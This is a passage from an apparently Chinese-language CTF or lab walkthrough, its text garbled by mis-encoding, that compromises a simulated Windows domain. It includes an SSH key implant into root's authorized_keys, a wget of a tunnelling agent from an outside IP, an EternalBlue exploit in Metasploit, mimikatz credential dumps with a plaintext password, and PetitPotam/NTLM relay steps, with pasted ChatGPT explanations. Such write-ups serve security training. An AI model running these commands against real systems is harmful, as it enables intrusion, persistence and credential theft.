echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCPPtZ/YfDn53qZ6yLEFM2srud8yTA/eR/tyViXgNa/uLOexKp5yy6Kd6sazfB5PFAZRhWkvdh1jrJyi7cZjPBGTmr8wNe+Yaa0ErFyQgYvODcfbXfh85GPOczpDEoUrwJqhxITx50jD+W1n90IE0Diz8A6KGHwzFYXXiFzViH28Baqm4ybrMKt21Z672OJPSk6zJlhWWS4ahjO/bY3eIgTAvVI4/CyoILKZeQyZLCvKzgNmMdBVzKxKnsYPL6ZvjK8ovdGfmuZzmYwEjl/gUWrEZW4by/91CcG+aZiTssRaQLTfEoJVGpElKpNLtw8/ZGjBSkNE1aYAKNdN2D2ft4XM6YiCwwmx7rD5ptA2DMH/2zrmJhCpeUMTAB57ypJ+5oDdq9tchxLv2Va3nijiRyg8RIU+TjIax+Trqa2DX2UFF1PRTaKD4BdMVemhyuFjAoNsyuJKaTCEUqnAsHNqicdQavK0ElrPl7EV46cpQX9VZeziUNt0aVxshXnZ+RoeEpnTnHQu2vRsIP96gydh2fKmr5SOWcY5NBGQsJti2EA77AU0CZv+PuWhFOMOR8w3+Uh4LblFJtLndNPNUf8V4aWNo5uT9/hhWgno38dHSSRvrOt4nGMaKCj4YoH8pCt/E9dMvIf5lpcNupQGsYFW8AiFPsjYRgtnQaP3AG9JTr5Hw== root@iZm5eh0goysydu2u3hlp07Z" &gt; /root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmhvlQ35AyfNg9MPyr9KOCrt+mCP2Q1yp/Q9i3sjRJW/dsQsAW6wAfboZ22gOV7NSb6rbme5/clnwcFV3rVae6Yzq2kXjUkKjLPO4RwtdBu5pXWplZzRaLv8ndJeMP0iL8HgAsvbkAaneeRBNhZ2JxNSInZz1VW3jIIV9VF4CjQFneJeSa2DTar/CCEx0q7ekUZDgqG84K2RZNCpQznk7u78ByPjHRxi30jfQcerFug/Zb+8MMaXXV2uPsrxq7c9ThNq8IZdRW6sqHw04WMAwVZYYKyOaHmqydG/9G8SBHQcHRRu43ZuxTmqULDqbOgb5u056mU+U0iDHp098pVmfFTkQCnhCQLdPT7QN3MVLlWRxXR8m30h1lD4j3z3PQ26QCK2e0h2gwO1C+1Y7C23lexw/8jMOMcPtF0WVK3VSKgSucLpIkYZPnuNg/0HqcteZKv1E8KdX5jfi9UcOltD6gXn0KYRtlykDph3mf5fVGIzctpvu5zdJXO9LSVoFhVBI7OMsr3gEGXrv6QgMxza7SW3YtrGnYjMjBIynItD/rib1OSdxpXVjWvXxfXUee7kYuL9ZinA6t7HL6Xt2JgZmCq1SYp2MVhwoUD/rl4sr+62szyThOdce/wzB7xWBzqHX09R0B8V3f9q4UPlJr3UVrjPOc40gUfpUhEHixJXvkQw== kali@kali" &gt; /root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¸€å †äººæ‰“çš„è¯æ³¨æ„sshè¦†ç›–ï¼ˆå…¬é’¥ï¼‰</p>
<blockquote>
<p>ps:</p>
<pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp# ls AliyunAssistClientSingleLock.lock aliyun_assist_service.sock argus.sock systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-chrony.service-q9qjhi systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-systemd-logind.service-6zJc8h systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-systemd-resolved.service-DeWMji systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-tomcat.service-NbtKaf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp# ls ls hsperfdata_root xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> ä½ çœ‹</p>
<h6 id="ChatGPT-è¯´ï¼š"><a href="#ChatGPT-è¯´ï¼š" class="headerlink" title="ChatGPT è¯´ï¼š"></a>ChatGPT è¯´ï¼š</h6><p>æˆ‘çœ‹å‡ºæ¥äº† ğŸ‘</p>
<p>ä½ è¿™è¾¹æœ‰ä¸¤ä¸ªä¸åŒçš„ shell ç¯å¢ƒï¼š</p>
<ul>
<li>åœ¨ <strong>SSH ç™»å½•</strong>åçœ‹åˆ°çš„ <code>/tmp</code> é‡Œæœ‰ä¸€å † <code>AliyunAssistClientâ€¦</code>ã€<code>systemd-private-â€¦</code> çš„ socket/lock æ–‡ä»¶ã€‚</li>
<li>åœ¨ä½  <strong>å¼¹å‡ºæ¥çš„å¦ä¸€ä¸ª root shell</strong> é‡Œ <code>/tmp</code> åªæœ‰ <code>hsperfdata_root</code> å’Œ <code>xx</code>ã€‚</li>
</ul>
<p>è¿™è¯´æ˜ï¼š<br> ğŸ‘‰ ä½ å…¶å®ä¸åœ¨åŒä¸€ä¸ªã€Œç³»ç»Ÿæ ¹ç¯å¢ƒã€ã€‚</p>
<p>æœ€å¸¸è§çš„ä¸¤ç§æƒ…å†µï¼š</p>
<ol>
<li><strong>å®¹å™¨ç¯å¢ƒ</strong><ul>
<li>ä½ é€šè¿‡æŸä¸ªæ¼æ´æ‹¿åˆ°çš„ root shellï¼Œå®é™…æ‰è¿›äº†å®¹å™¨ï¼ˆæ¯”å¦‚ Tomcat çš„å®¹å™¨ç¯å¢ƒï¼‰ã€‚å®¹å™¨é‡Œçš„ <code>/tmp</code> åªæœ‰å®¹å™¨è‡ªå·±äº§ç”Ÿçš„ä¸œè¥¿ã€‚</li>
<li>è€Œä½ ç”¨ SSH ç™»è¿›å»ï¼Œè¿›çš„æ˜¯å®¿ä¸»æœºçš„ root ç”¨æˆ·ï¼Œçœ‹åˆ°çš„æ˜¯å®¿ä¸»æœºçš„ <code>/tmp</code>ã€‚</li>
</ul>
</li>
<li><strong>chroot/jail</strong><ul>
<li>ä½ å¼¹çš„ shell è¢«é™åˆ¶åœ¨æŸä¸ª <code>chroot</code> ç›®å½•ä¸‹ï¼Œåªèƒ½çœ‹åˆ°é‚£é‡Œçš„ <code>/root</code>ã€<code>/tmp</code>ï¼Œè·Ÿå®¿ä¸»æœºå®Œå…¨ä¸ä¸€æ ·ã€‚</li>
</ul>
</li>
</ol>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# cat /root/flag/flag01.txt
cat /root/flag/flag01.txt
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                             â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ                 
 â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                     â–‘â–ˆâ–ˆâ–‘ â–‘â–‘            â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
â–‘â–ˆâ–ˆ       â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ
â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘ â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ
â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
       â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘  â–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆ
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ     â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘       â–‘â–‘â–‘â–‘â–‘â–‘   â–‘â–‘â–‘â–‘â–‘â–‘    â–‘â–‘   â–‘â–‘ â–‘â–‘â–‘   â–‘â–‘  â–‘â–‘â–‘â–‘â–‘  

This is the first flag you get.

flag01: flag{10e32b00-2f48-45a1-b407-760619d715ef}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>æ­£å¸¸æµç¨‹</p>
<pre class="line-numbers language-none"><code class="language-none">æ”»å‡»æœºï¼š
python3 -m http.server
é¶æœº
wget 47.104.168.57:8000/linux_x64_agent

./linux_x64_admin -c 39.99.132.128:7879 -s 123

./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# ifconfig
ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.22.11.76  netmask 255.255.0.0  broadcast 172.22.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# ./fscan -h 172.22.11.0/24
./fscan -h 172.22.11.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.11.6     is alive
(icmp) Target 172.22.11.45    is alive
(icmp) Target 172.22.11.76    is alive
(icmp) Target 172.22.11.26    is alive
[*] Icmp alive hosts len is: 4
172.22.11.6:139 open
172.22.11.26:135 open
172.22.11.76:80 open
172.22.11.45:135 open
172.22.11.6:88 open
172.22.11.76:22 open
172.22.11.26:445 open
172.22.11.45:445 open
172.22.11.6:445 open
172.22.11.26:139 open
172.22.11.45:139 open
172.22.11.6:135 open
172.22.11.76:8080 open
172.22.11.76:8009 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo 
[*]172.22.11.26
   [-&gt;]XR-LCM3AE8B
   [-&gt;]172.22.11.26
[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          
[*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    
[*] NetInfo 
[*]172.22.11.6
   [-&gt;]XIAORANG-DC
   [-&gt;]172.22.11.6
[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:åå°ç®¡ç†
[*] WebTitle http://172.22.11.76       code:401 len:0      title:None
å·²å®Œæˆ 14/14
[*] æ‰«æç»“æŸ,è€—æ—¶: 16.034090031s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<table>
<thead>
<tr>
<th>ä¸»æœº</th>
<th>æ¼æ´/é£é™©</th>
<th>ç«¯å£/æœåŠ¡</th>
</tr>
</thead>
<tbody><tr>
<td>172.22.11.45</td>
<td>MS17-010 (é«˜å± RCE)</td>
<td>135/139/445</td>
</tr>
<tr>
<td>172.22.11.76</td>
<td>Webåå°ç®¡ç†ï¼ˆé»˜è®¤/å¼±å£ä»¤é£é™©ï¼‰</td>
<td>80/8080/22/8009</td>
</tr>
<tr>
<td>172.22.11.6</td>
<td>åŸŸæ§ä¿¡æ¯æ³„éœ²ï¼ŒSMB/RPC é£é™©</td>
<td>88/135/139/445</td>
</tr>
<tr>
<td>172.22.11.26</td>
<td>SMB/åŸŸä¿¡æ¯æšä¸¾</td>
<td>135/445</td>
</tr>
</tbody></table>
</blockquote>
<p>æ‰“æ°¸æ’ä¹‹è“</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.11.45
set lport 4567(4444è¢«å äº†å°±æ¢ä¸€ä¸ªï¼Œä¸ç„¶ä¸é€š)
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; ls C:\
Listing: C:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  4096    dir   2023-02-01 00:53:14 -0500  $Recycle.Bin
040777/rwxrwxrwx  4096    dir   2023-01-31 23:55:48 -0500  Boot
040777/rwxrwxrwx  0       dir   2009-07-14 01:06:44 -0400  Documents and Settings
040777/rwxrwxrwx  0       dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096    dir   2023-02-01 00:46:57 -0500  Program Files
040555/r-xr-xr-x  4096    dir   2020-01-15 03:15:18 -0500  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2023-02-01 00:50:01 -0500  ProgramData
040777/rwxrwxrwx  0       dir   2023-01-31 23:24:48 -0500  Recovery
040777/rwxrwxrwx  4096    dir   2020-01-14 19:01:47 -0500  System Volume Information
040555/r-xr-xr-x  4096    dir   2023-02-01 00:53:42 -0500  Users
040777/rwxrwxrwx  16384   dir   2025-09-25 02:08:49 -0400  Windows
100444/r--r--r--  399860  fil   2019-07-17 01:35:58 -0400  bootmgr

meterpreter &gt; ls C:\\Users\\.
#Windows è·¯å¾„åæœ‰æ—¶å¯¹ Meterpreter å†…éƒ¨è·¯å¾„è§£æä¸å‹å¥½ï¼ˆå°¤å…¶æ˜¯ä¸­æ–‡æˆ–ç‰¹æ®Šç¬¦å·ï¼‰ã€‚
#å°è¯•ç”¨çŸ­è·¯å¾„åï¼ˆ8.3ï¼‰
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Listing: C:\Users\.
===================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2023-02-01 01:18:55 -0500  Administrator
040777/rwxrwxrwx  0     dir   2023-02-01 00:53:42 -0500  Administrator.XIAORANG
040777/rwxrwxrwx  0     dir   2009-07-14 01:06:44 -0400  All Users
040555/r-xr-xr-x  8192  dir   2020-01-14 19:04:37 -0500  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:06:44 -0400  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 00:57:55 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:57:55 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2023-02-01 00:53:14 -0500  yangmei

meterpreter &gt; cat C:\\Users\\Administrator\\flag\\flag02.txt.
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
                                                      ##                        
  :####:                                   :####      ##                        
 :######                                   #####      ##                        
 ##:  :#                                   ##                                   
 ##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:## 
 ###:      #######:  .######.  .######.  #######    ####     #######   .####### 
 :#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ### 
  .#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## 
     :###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ## 
       ##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## 
 #:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ### 
 #######:  #######:  .######.  .######.    ##      ########  ##    ##  .####### 
 .#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:## 
           ##                                                           #.  :## 
           ##                                                           ######  
           ##                                                           :####:  


flag02: flag{ffd82b2a-8762-4dd2-95c2-bae51147e03b}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>å…ˆæŠ“ä¸€ä¸‹å“ˆå¸Œ</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load kiwi
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

//åˆ—å‡ºå½“å‰ç³»ç»Ÿå†…å­˜å’Œç¼“å­˜ä¸­æ‰€æœ‰å¯ç”¨çš„å‡­æ®
meterpreter &gt; creds_all
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  738dcc0171b84e1a36400008983a3e10  fdc3f1fd9d44fea97d24ce212d6339ec890cfdf4
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f

wdigest credentials
===================

Username     Domain    Password
--------     ------    --------
(null)       (null)    (null)
XR-DESKTOP$  XIAORANG  7d c7 ba cf 2e 52 36 1a 8a 7c 53 e3 dc 71 7e d4 3a 3e c1 e5 60 0d 09 2a a6 b2 b3 73 19 32 1f d8 7d 28 69 48 fe 7a 4c 28 32 49 58 e9 47 71 98 8e 51 c0 80 74
                        ed 14 91 fb e0 43 21 37 75 cf d5 91 53 0f 96 03 48 99 1d 54 34 52 71 96 b0 a2 af 96 96 c4 18 53 4b 71 f6 72 22 2b 74 64 69 05 38 e9 d6 a2 22 cc 3a 98 f2 7
                       d aa f2 e0 07 ee 92 8c 31 24 fa 42 c4 94 1b e5 8e c4 df 80 c0 09 7b aa af dd cd 8f 86 08 e1 41 4d 53 2e 0d d8 91 2f d8 36 a8 1f 7a e8 0d 47 a4 16 1a c4 56
                       b9 e0 96 13 ef c9 70 8c 64 8d 9a d5 75 7f 2f 3d c4 36 5e 1f 8a 16 6c 9e aa 11 01 b1 13 ab 0d f8 dd 98 3a d1 01 b6 e1 f5 51 50 82 eb 02 b5 bb c0 cc 4b 63 f4
                        71 0f 2c 49 de 19 3d a3 cf ab 32 29 a6 69 04 77 76 63 a7 3a 5a b9 f6 7f 97 b9 6b ff 22 84 6e 22 9d
yangmei      XIAORANG  xrihGHgoNZQ     //(æ˜æ–‡å¯†ç )

kerberos credentials
====================

Username     Domain        Password
--------     ------        --------
(null)       (null)        (null)
xr-desktop$  XIAORANG.LAB  7d c7 ba cf 2e 52 36 1a 8a 7c 53 e3 dc 71 7e d4 3a 3e c1 e5 60 0d 09 2a a6 b2 b3 73 19 32 1f d8 7d 28 69 48 fe 7a 4c 28 32 49 58 e9 47 71 98 8e 51 c0 8
                           0 74 ed 14 91 fb e0 43 21 37 75 cf d5 91 53 0f 96 03 48 99 1d 54 34 52 71 96 b0 a2 af 96 96 c4 18 53 4b 71 f6 72 22 2b 74 64 69 05 38 e9 d6 a2 22 cc 3a
                            98 f2 7d aa f2 e0 07 ee 92 8c 31 24 fa 42 c4 94 1b e5 8e c4 df 80 c0 09 7b aa af dd cd 8f 86 08 e1 41 4d 53 2e 0d d8 91 2f d8 36 a8 1f 7a e8 0d 47 a4
                           16 1a c4 56 b9 e0 96 13 ef c9 70 8c 64 8d 9a d5 75 7f 2f 3d c4 36 5e 1f 8a 16 6c 9e aa 11 01 b1 13 ab 0d f8 dd 98 3a d1 01 b6 e1 f5 51 50 82 eb 02 b5 b
                           b c0 cc 4b 63 f4 71 0f 2c 49 de 19 3d a3 cf ab 32 29 a6 69 04 77 76 63 a7 3a 5a b9 f6 7f 97 b9 6b ff 22 84 6e 22 9d
xr-desktop$  XIAORANG.LAB  (null)
yangmei      XIAORANG.LAB  (null)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2267322?areaSource=102001.14&amp;traceId=_iQlKVfB_eijDszgwHMVs">é€šè¿‡WebDavè¿›è¡ŒNTLM Relay-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
<p>æ‰«ä¸€ä¸‹WebClientå’Œpetitpotam</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/dedb62b84da42afbcd65b4fc9e71cabb.png"></p>
<blockquote>
<ul>
<li>A = ä½ æœ¬åœ°ï¼ˆè¿è¡Œ ntlmrelayxã€æ¥æ”¶/å¤„ç† NTLM çš„åœ°æ–¹ï¼Œæˆ–è¿è¡Œ impacket å·¥å…·ï¼‰</li>
<li>B = è·³æ¿/è¿œç«¯æœåŠ¡å™¨ï¼ˆ<code>39.99.132.128</code>ï¼Œç›®æ ‡å†…ç½‘å’Œ/æˆ–ç›®æ ‡èƒ½è®¿é—®åˆ°å®ƒï¼‰</li>
<li>T = ç›®æ ‡æœºå™¨ï¼ˆè¢« PetitPotam å¼ºåˆ¶å»è®¿é—®ä¸€ä¸ª URLï¼Œä¼šå¯¹è¯¥ URL å‘èµ· NTLM è®¤è¯ï¼‰</li>
</ul>
<p>ä½ è¦ç›®æ ‡ T çš„è¯·æ±‚æœ€ç»ˆèƒ½åˆ°è¾¾ Aï¼Œä½† T ä¸èƒ½ç›´æ¥è¿ Aï¼Œå®ƒèƒ½è¿ Bã€‚äºæ˜¯ä½ åœ¨ B ä¸Šæš´éœ²ä¸€ä¸ª HTTP ç«¯å£ï¼Œå¹¶æŠŠé‚£æµé‡â€œéš§é“â€å› Aã€‚</p>
<p>Q:ä¸ºä»€ä¹ˆæˆ‘ä¸èƒ½ç›´æ¥åœ¨39.99.132.128ä¸Šå¼€ä¸ªsocks5,æœ¬åœ°ç”¨proxychainså°±èƒ½è®¿é—®T?</p>
<p>A:SOCKS5 æ˜¯â€œå®¢æˆ·ç«¯å‘ä»£ç†å‘èµ·è¯·æ±‚å¹¶ç»ç”±ä»£ç†å‡ºç«™â€ï¼Œ<strong>ä¸æ˜¯</strong>æŠŠä»£ç†æš´éœ²ç»™å¤–éƒ¨ä¸»æœºæ¥è®©å¤–éƒ¨ä¸»åŠ¨è¿å›ä½ </p>
<ul>
<li><p>SOCKS5ï¼ˆåœ¨ B ä¸Šï¼‰å…è®¸ <strong>ä½ ï¼ˆAï¼‰</strong> æˆ–å…¶ä»–å®¢æˆ·ç«¯è¿æ¥åˆ° Bï¼Œç„¶åé€šè¿‡ B å»è®¿é—®å†…ç½‘æˆ–äº’è”ç½‘ç›®æ ‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>å®¢æˆ·ç«¯åˆ°ä»£ç†æ˜¯å‡ºç«™è¿æ¥</strong>ï¼ˆå®¢æˆ·ç«¯ä¸»åŠ¨è¿åˆ°ä»£ç†ï¼‰ã€‚</p>
</li>
<li><p>PetitPotam æƒ…å†µæ°æ°ç›¸åï¼š<strong>ç›®æ ‡ T å¿…é¡»ä¸»åŠ¨å»è®¿é—®ä½ æ§åˆ¶çš„ HTTP æ¥æ”¶å™¨</strong>ï¼ˆT æ˜¯å‘èµ·æ–¹ï¼‰ã€‚T ä¸ä¼šâ€œä½¿ç”¨ SOCKS ä»£ç†â€å»æŠŠå®ƒçš„ NTLM æ¡æ‰‹å‘ç»™ä½ ï¼Œé™¤éä½ èƒ½åœ¨ T ä¸Šé…ç½®ä»£ç†ï¼ˆä¸å¯èƒ½ï¼‰ã€‚</p>
</li>
<li><p>å› æ­¤ï¼šæŠŠ SOCKS5 åœ¨ B ä¸Šå¼€èµ·æ¥åï¼Œ<strong>ä½ å¯ä»¥ä» A å€ŸåŠ©è¿™ä¸ª SOCKS è®¿é—® T</strong>ï¼ˆA â†’ SOCKS(B) â†’ Tï¼‰ï¼Œä½†è¿™å¹¶ä¸ä¼šè®© T â†’ ä½ ï¼ˆAï¼‰å»ºç«‹è¿æ¥ï¼Œä¹Ÿå°±æ— æ³•æŠŠ NTLM challenge/response å‘å›ç»™ä½ ç”¨äºä¸­ç»§ã€‚</p>
</li>
</ul>
<p>ä½ å¼€ SOCKS åœ¨ Bï¼š</p>
<ul>
<li>ç”¨é€”ï¼šA â†’ï¼ˆSOCKS@Bï¼‰â†’ å†…ç½‘èµ„æºï¼ˆä½ ä½œä¸ºå®¢æˆ·ç«¯é€šè¿‡ B å‡ºç«™ï¼‰ã€‚</li>
<li>ä¸æ»¡è¶³ï¼šè®© T ä¸»åŠ¨æŠŠè®¤è¯å‘ç»™ä½ ï¼ˆå› ä¸º T å¹¶ä¸ä¼šèµ° SOCKSï¼‰ã€‚</li>
</ul>
<p>ä½ åœ¨ B ä¸Šå¼€ HTTPï¼ˆ0.0.0.0:80ï¼‰æˆ–æŠŠ HTTP æš´éœ²å‡ºæ¥ï¼š</p>
<ul>
<li>ç”¨é€”ï¼šT â†’ï¼ˆHTTP@Bï¼‰â†’ ä½ çš„æ¥æ”¶ç«¯ï¼ˆB æˆ–ç»éš§é“å› Aï¼‰ã€‚</li>
<li>è¿™æ˜¯ PetitPotam éœ€è¦çš„ï¼šç›®æ ‡å¿…é¡»èƒ½è¿åˆ°ä¸€ä¸ªâ€œç›‘å¬çš„ HTTP åœ°å€â€ã€‚</li>
</ul>
<p>[ps:so,å¦‚æœä½ æ„¿æ„æŠŠ ntlmrelayx/æ¥æ”¶é€»è¾‘ä¹Ÿè·‘åœ¨è·³æ¿ Bï¼Œå°±ä¸éœ€è¦æŠŠæµé‡å›éš§é“åˆ° Aï¼šT â†’ B:80ï¼ˆB æœ¬åœ°å¤„ç†ï¼‰(really?)]</p>
</blockquote>
